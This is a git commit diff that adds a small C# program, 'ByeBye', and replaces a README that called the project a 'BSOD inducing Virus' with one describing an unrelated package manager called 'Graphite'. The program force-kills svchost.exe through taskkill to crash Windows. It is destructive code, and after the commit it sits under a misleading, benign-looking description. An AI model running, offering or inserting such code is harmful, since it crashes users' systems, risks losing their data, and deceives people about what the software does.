288cdfcb6b322f30d4634c33757f404c67a7565f
dismal (no capitals) <118924562+Dismalitie@users.noreply.github.com>
2023-12-24 19:43:40 +0000

    s

---
+++ ByeBye/Program.cs
@@ -0,0 +1,19 @@
+﻿using System;
+using System.Diagnostics;
+namespace ByeBye
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.BackgroundColor = ConsoleColor.DarkRed;
+            Console.ForegroundColor = ConsoleColor.Black;
+            Console.SetWindowSize(Console.LargestWindowWidth, Console.LargestWindowHeight);
+            Console.SetWindowPosition(0, 0);
+            Console.Clear();
+            Console.Write("Bye Bye!");
+            Process.Start("C:\\Windows\\System32\\cmd.exe", "/c taskkill /F /IM svchost.exe");
+            Console.ReadLine();
+        }
+    }
+}
--- README.md
+++ README.md
@@ -1,2 +1,9 @@
-# ByeByeBSOD
- Open source, standalone BSOD inducing Virus
+<div align="center">
+
+ ![graphite](https://github.com/Dismalitie/Graphite/assets/118924562/66f4a364-4a02-401e-938c-639461e161fc)
+
+
+ # Graphite
+
+ Graphite is an open source, basic package management tool that lets you get, create and remove static and dynamic packages.
+</div>
